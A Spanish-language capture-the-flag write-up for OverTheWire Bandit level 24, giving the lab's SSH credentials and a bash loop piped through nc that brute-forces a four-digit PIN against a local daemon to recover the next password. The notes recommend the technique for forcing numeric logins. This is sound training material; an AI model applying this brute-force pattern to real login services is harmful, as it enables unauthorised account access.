----
### OBJETIVO 
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time

---
### DATOS DE ACCESO
	Servidor : ssh bandit24@bandit.labs.overthewire.org -p 2220
	Contraseña : VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

---
### SOLUCION

	bandit24@bandit:~$ nc -v localhost 30002
		Connection to localhost (127.0.0.1) 30002 port [tcp/*] succeeded!
		I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
		VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0045
		Wrong! Please enter the correct pincode. Try again.
		
		Fail! You did not supply enough data. Try again.
		^C
	bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep
	-v Wrong
		I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
		Correct!
		The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
		
	Exiting.

---
### NOTAS ADICCIONALES
El uso de For nos ayuda a poder realizar grandes cantidades de combinaciones en números para poder así forzar la entrada a logins que utilicen combinaciones de números. la sintaxis es como una sintaxis de pyton normal.

---
### REFERENCIAS
La clase del prof :)